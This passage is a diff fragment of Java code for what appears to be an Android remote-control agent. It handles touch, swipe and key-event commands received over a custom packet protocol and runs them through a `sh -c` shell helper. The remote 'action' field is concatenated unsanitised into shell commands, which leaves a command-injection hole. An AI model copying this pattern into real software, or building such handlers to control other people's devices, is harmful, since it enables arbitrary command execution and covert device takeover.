+                int x2 = p.optInt("x2", x + 100);
+                int y2 = p.optInt("y2", y);
+                int dur= p.optInt("duration", 300);
+                result = shell("input swipe " + x + " " + y + " " + x2 + " " + y2 + " " + dur);
+                break;
+            default:
+                result = shell("input " + action + " " + x + " " + y);
+        }
+        sendResult("TOUCH_OK:" + action + "(" + x + "," + y + ")" + (result != null ? ":" + result : ""));
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  [0x51] INPUT_KEY_EVENT - send key press
+    // ══════════════════════════════════════════════════════════════════════════
+    private void handleKeyEvent(String payload) throws Exception {
+        JSONObject p  = new JSONObject(payload);
+        int keyCode   = p.optInt("keyCode", -1);
+        String unicode= p.optString("unicode", "");
+        String result;
+        if (keyCode > 0) {
+            result = shell("input keyevent " + keyCode);
+            sendResult("KEY_EVENT_OK:keyCode=" + keyCode);
+        } else if (!unicode.isEmpty()) {
+            result = shell("input text '" + unicode.replace("'", "") + "'");
+            sendResult("KEY_TEXT_OK:" + unicode);
+        } else {
+            sendResult("KEY_EVENT_ERROR:No keyCode or unicode");
+        }
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  LOW-LEVEL HELPERS
+    // ══════════════════════════════════════════════════════════════════════════
+    private void sendResult(String msg) throws Exception {
+        sendPacket(TYPE_RESULT, msg.getBytes("UTF-8"));
+    }
+
+    private synchronized void sendPacket(byte type, byte[] payload) throws Exception {
+        if (out == null) return;
+        java.nio.ByteBuffer header = java.nio.ByteBuffer.allocate(7).order(java.nio.ByteOrder.LITTLE_ENDIAN);
+        header.put(MAGIC);
+        header.put(VERSION);
+        header.put(type);
+        header.putInt(payload != null ? payload.length : 0);
+        out.write(header.array());
+        if (payload != null && payload.length > 0) out.write(payload);
+        out.flush();
+    }
+
+    private byte[] readFileBytes(File f) throws IOException {
+        byte[] buf = new byte[(int) f.length()];
+        try (FileInputStream fis = new FileInputStream(f)) { fis.read(buf); }
+        return buf;
+    }
+
+    private String shell(String cmd) {
+        try {
+            ProcessBuilder pb = new ProcessBuilder("sh", "-c", cmd);
+            pb.redirectErrorStream(true);
+            Process p = pb.start();
+            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+            StringBuilder sb = new StringBuilder();
+            String line;
+            while ((line = br.readLine()) != null) sb.append(line).append("\n");
+            p.waitFor();
+            return sb.toString().trim();
+        } catch (Exception e) { return ""; }
+    }
+
+    private static String bytesToHex(byte[] bytes) {
+        StringBuilder sb = new StringBuilder();
+        for (byte b : bytes) sb.append(String.format("%02x", b));
+        return sb.toString();
+    }
+}
